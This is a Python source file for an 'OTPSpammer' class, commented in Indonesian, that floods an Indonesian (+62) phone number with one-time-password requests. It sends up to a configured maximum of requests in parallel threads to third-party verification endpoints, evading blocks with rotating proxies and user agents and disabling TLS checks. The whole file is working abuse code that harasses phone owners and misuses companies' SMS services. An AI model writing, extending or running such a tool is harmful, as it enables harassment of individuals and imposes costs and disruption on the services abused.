# ================================================================
# src/spammer.py — OTPSpammer Class (Multi-Thread)
# ================================================================

import time
import random
import re
import threading
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

from src.config import Config
from src.utils import ProxyManager, UserAgentManager
from src.endpoints import get_endpoints

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class OTPSpammer:
    def __init__(self):
        self.proxy_manager = ProxyManager()
        self.ua_manager = UserAgentManager()
        self.endpoints = get_endpoints()
        self.results = []
        self.success_count = 0
        self.fail_count = 0
        self.lock = threading.Lock()
    
    def send_otp(self, endpoint, nomor, retry=0):
        """Kirim satu request OTP dengan retry"""
        try:
            # Generate URL
            url = endpoint["url"](nomor) if callable(endpoint["url"]) else endpoint["url"]
            
            # Generate data
            data = None
            if "data" in endpoint and callable(endpoint["data"]):
                data = endpoint["data"](nomor)
            elif "data" in endpoint:
                data = endpoint["data"]
            
            json_data = None
            if "json" in endpoint and callable(endpoint["json"]):
                json_data = endpoint["json"](nomor)
            elif "json" in endpoint:
                json_data = endpoint["json"]
            
            # Headers
            headers = {
                "User-Agent": self.ua_manager.get_ua(),
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive"
            }
            
            # Proxy
            proxy = self.proxy_manager.get_proxy()
            
            # Send request
            if endpoint.get("method", "POST").upper() == "GET":
                response = requests.get(
                    url,
                    headers=headers,
                    proxies=proxy,
                    timeout=Config.TIMEOUT,
                    verify=False
                )
            else:
                response = requests.post(
                    url,
                    data=data,
                    json=json_data,
                    headers=headers,
                    proxies=proxy,
                    timeout=Config.TIMEOUT,
                    verify=False
                )
            
            # Check response
            if response.status_code in [200, 201, 202, 204]:
                return {"status": "SUCCESS", "code": response.status_code}
            else:
                return {"status": "FAILED", "code": response.status_code}
                
        except Exception as e:
            if retry < Config.MAX_RETRY:
                time.sleep(random.uniform(0.5, 1.5))
                return self.send_otp(endpoint, nomor, retry + 1)
            return {"status": "ERROR", "error": str(e)[:50]}
    
    def run_spam_parallel(self, nomor, amount=100, threads=50):
        """Spam paralel dengan multi-threading"""
        # Bersihkan nomor
        nomor = re.sub(r'\D', '', nomor)
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor
        
        # Batasi amount
        amount = min(amount, Config.MAX_AMOUNT)
        threads = min(threads, Config.MAX_THREADS)
        
        self.results = []
        self.success_count = 0
        self.fail_count = 0
        
        # Buat queue tasks
        tasks = []
        for _ in range(amount):
            endpoint = random.choice(self.endpoints)
            tasks.append((endpoint, nomor))
        
        # Eksekusi paralel
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(self.send_otp, endpoint, nomor): (i, endpoint["name"])
                for i, (endpoint, _) in enumerate(tasks)
            }
            
            for i, future in enumerate(as_completed(futures)):
                idx, endpoint_name = futures[future]
                try:
                    result = future.result()
                    with self.lock:
                        if result.get("status") == "SUCCESS":
                            self.success_count += 1
                        else:
                            self.fail_count += 1
                        self.results.append({
                            "attempt": i + 1,
                            "endpoint": endpoint_name,
                            "result": result
                        })
                except Exception:
                    with self.lock:
                        self.fail_count += 1
        
        elapsed = time.time() - start_time
        
        return {
            "total": amount,
            "success": self.success_count,
            "failed": self.fail_count,
            "success_rate": f"{(self.success_count/amount*100):.1f}%" if amount > 0 else "0%",
            "speed": f"{amount/elapsed:.1f} OTP/s" if elapsed > 0 else "0 OTP/s",
            "duration": f"{elapsed:.1f}s",
            "results": self.results[:20]
              }
